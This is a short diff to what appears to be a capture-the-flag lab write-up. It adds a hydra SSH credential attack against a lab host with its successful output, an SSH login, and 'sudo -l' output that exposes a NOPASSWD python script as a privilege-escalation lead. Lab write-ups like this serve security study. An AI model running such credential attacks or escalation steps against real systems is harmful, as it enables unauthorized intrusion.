@@ -96,4 +96,16 @@ Try harder !
 hydra
 ```c
 hydra -l tignasse -p 716n4553 ssh://192.168.18.238
+
+[22][ssh] host: 192.168.18.238   login: tignasse   password: 716n4553
+```
+
+ssh
+```c
+┌──(kali㉿kali)-[~]
+└─$ sudo ssh tignasse@192.168.18.238
+
+tignasse@kuus:~$ sudo -l
+    (mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py
+
 ```
